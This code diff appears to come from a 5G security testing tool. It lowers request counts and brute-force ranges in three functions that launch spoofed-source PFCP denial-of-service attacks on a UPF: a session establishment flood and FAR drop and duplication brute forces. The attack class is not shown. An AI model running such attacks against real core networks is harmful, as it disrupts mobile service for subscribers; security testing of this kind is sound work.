@@ -16,7 +16,7 @@ def pfcp_session_establishment_flood_customized(spoofed_addr):
         lambda: PFCPDosAttack().start_pfcp_session_establishment_flood(
             evil_addr=spoofed_addr,
             upf_addr=ip_list["UPF"],
-            reqNbr=100,
+            reqNbr=20,
             random_far_number=20,
         ),
     )
@@ -48,8 +48,8 @@ def pfcp_session_modification_far_drop_bruteforce_customized(spoofed_addr):
         lambda: PFCPDosAttack().start_pfcp_session_modification_far_drop_bruteforce(
             evil_addr=spoofed_addr,
             upf_addr=ip_list["UPF"],
-            far_range=50,
-            session_range=100,
+            far_range=20,
+            session_range=20,
         ),
     )
 
@@ -60,8 +60,8 @@ def pfcp_session_modification_far_dupl_bruteforce_customized(spoofed_addr):
         lambda: PFCPDosAttack().start_pfcp_session_modification_far_dupl_bruteforce(
             evil_addr=spoofed_addr,
             upf_addr=ip_list["UPF"],
-            far_range=50,
-            session_range=100,
+            far_range=20,
+            session_range=20,
         ),
     )
 
